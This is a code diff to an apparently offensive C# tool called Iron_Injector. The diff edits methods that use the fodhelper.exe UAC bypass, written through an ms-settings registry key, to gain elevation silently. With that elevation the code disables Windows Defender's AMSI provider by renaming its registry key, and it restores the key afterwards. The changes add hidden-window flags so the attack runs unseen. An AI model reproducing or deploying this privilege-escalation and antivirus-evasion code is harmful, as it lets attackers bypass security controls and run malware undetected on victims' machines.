@@ -20,12 +20,12 @@ namespace Iron_Injector.Commands.Program_Commands
     {
         public static string Url { get; set; }
         public static string ProgramName { get; set; }
-        public static Dictionary<string,Assembly> assemList = new Dictionary<string, Assembly>();
+        public static Dictionary<string, Assembly> assemList = new Dictionary<string, Assembly>();
         public static int retry = 0;
 
         public static void ExecuteASM()
         {
-           
+
             Url = (ModuleBase.ModuleOptions.FirstOrDefault(u => u.Name.Equals("url", StringComparison.OrdinalIgnoreCase))).CurrentValue;
             ProgramName = (ModuleBase.ModuleOptions.FirstOrDefault(f => f.Name.Equals("programname", StringComparison.OrdinalIgnoreCase))).CurrentValue;
 
@@ -84,8 +84,8 @@ namespace Iron_Injector.Commands.Program_Commands
             {
                 return;
             }
-            
-           
+
+
         }
 
         public static void noMoreSpy()
@@ -93,13 +93,14 @@ namespace Iron_Injector.Commands.Program_Commands
             Console.WriteLine("Fodhelper for the win?");
             RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\Command", true);
             Console.WriteLine("Created registry key");
-            key.SetValue("DelegateExecute","");
-            key.SetValue("", @"cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse");
+            key.SetValue("DelegateExecute", "");
+            key.SetValue("", @"cmd.exe /min /c powershell -windowstyle hidden New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse");
             Console.WriteLine("set key values");
 
             var p = new Process();
+            p.StartInfo.CreateNoWindow = true;
             p.StartInfo.FileName = "fodhelper.exe";
-             bool didStart = p.Start();
+            bool didStart = p.Start();
             if (didStart == false)
             {
                 Console.WriteLine("Fodhelper failed to start");
@@ -107,33 +108,34 @@ namespace Iron_Injector.Commands.Program_Commands
             }
             Console.WriteLine($"fodhelper activated at pid {p.Id} it that shall not be named should be dead, but will be reset once interactive prompt exits.");
 
-            RegistryKey check =  Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\AMSI\Providers\",false);
-           string[] subNames = check.GetSubKeyNames();
+            RegistryKey check = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\AMSI\Providers\", false);
+            string[] subNames = check.GetSubKeyNames();
 
             foreach (var name in subNames)
             {
-                   var retrycount = 1;
-                   if(retry == retrycount)
-                   {
-                       break;
-                   }
+                var retrycount = 1;
+                if (retry == retrycount)
+                {
+                    break;
+                }
                 if (name == "{2781761E-28E0-4109-99FE-B9D127C57AFE}")
                 {
-                        retry++;
-                        Console.WriteLine("did not update key name");
-                        noMoreSpy();
+                    retry++;
+                    Console.WriteLine("did not update key name");
+                    noMoreSpy();
                 }
             }
         }
 
         public static void fixSpy()
         {
-            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\Command", true); 
+            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\Command", true);
             key.SetValue("DelegateExecute", "");
-            key.SetValue("", @"cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Recurse");
+            key.SetValue("", @"cmd.exe /min /c powershell -windowstyle hidden New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Recurse");
 
 
             var p = new Process();
+            p.StartInfo.CreateNoWindow = true;
             p.StartInfo.FileName = "fodhelper.exe";
             p.Start();
             Console.WriteLine($"fodhelper activated at pid { p.Id} Fixed key back.");
